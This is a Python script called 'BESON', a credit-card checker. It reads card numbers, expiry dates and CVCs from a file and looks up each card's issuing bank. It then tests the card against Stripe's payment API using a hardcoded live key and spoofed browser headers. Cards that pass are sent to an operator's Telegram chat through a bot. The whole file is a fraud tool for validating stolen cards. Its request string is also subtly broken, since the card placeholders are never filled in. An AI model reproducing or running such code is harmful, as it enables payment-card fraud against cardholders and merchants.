import requests
import pyfiglet

file = open('BESON.txt', "r")
Z = '\033[1;31m'
F = '\033[2;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'

logo = pyfiglet.figlet_format('            BESON ')
print(Z + logo)
log = pyfiglet.figlet_format(' V 1 . 0 ')
print(F + log)
k = ("----♡----♡-----♡------♡-----♡----♡----♡-----♡------♡-----♡")
print(X + k)
print(B + k)

k = ("----♡----♡-----♡------♡-----♡----♡----♡-----♡------♡-----♡")
token = input('ENTER TOKEN: ')
ID = input('ENTER ID: ')
print(C + k)

for P in file.readlines():
    start_num = 1
    n = P.split('|')[0]
    mm = P.split('|')[1]
    yy = P.split('|')[2][-2:]
    cvc = P.split('|')[3].replace('\n', '')
    P = P.replace('\n', '')
    
    try:
        data = requests.get('https://lookup.binlist.net/' + P[:6]).json()
    except:
        pass
    
    try:
        bank = data['bank']['name']
    except:
        bank = 'unknown ⚠️'
    
    try:
        emj = data['country']['emoji']
    except:
        emj = 'unknown ⚠️'
    
    try:
        cn = data['country']['name']
    except:
        cn = 'unknown ⚠️'
    
    try:
        dicr = data['scheme']
    except:
        dicr = 'unknown ⚠️'
    
    try:
        typ = data['type']
    except:
        typ = 'unknown ⚠️'
    
    try:
        url = data['bank']['url']
    except:
        url = 'unknown ⚠️'
        
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    }
    
    data = 'type=card&billing_details[name]=BESON+FEGE&billing_details[address][line1]=&billing_details[address][city]=&postal_code]=&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9fb61995-4af3-4c06-8081-7f84afa3bad5807102&muid=b13a17f2-8edd-4661-a5e0-b84e1893b39242dec3&sid=d7741805-9d44-451a-934a-e0e15646e97a8d5f92&pasted_fields=number&payment_user_agent=stripe.js%2Fa0dcebad62%3B+stripe-js-v3%2Fa0dcebad62%3B+split-card-element&time_on_page=154203&key=pk_live_ECdoUHKMCDhZOSh2bJLLfBGa'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    if "Live" in response.text:
        print(F + f'''◆ 𝑪𝑨𝑹𝑫  ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝑪𝑯𝑨𝑹𝑮𝑬  ✅ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ STRIPE $5
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url} ''')
        print(Z + k)
        
        mgs = f'''◆ 𝑪𝑨𝑹𝑫  ➜ {P} 
𝑪𝑯𝑨𝑹𝑮𝑬  ✅ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ STRIPE $5
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url} 
━━━━━━━━━━━━━━━━━
◆ BESON * BESON * BESON
◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
        
        tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
        i = requests.post(tlg)
        
    else:
        print(Z + f'''◆ 𝑪𝑨𝑹𝑫  ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝘿𝙀𝘼𝘿   ❌ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝘿𝙀𝘼𝘿 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ STRIPE $5
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url} ''')
        print(Z + k)
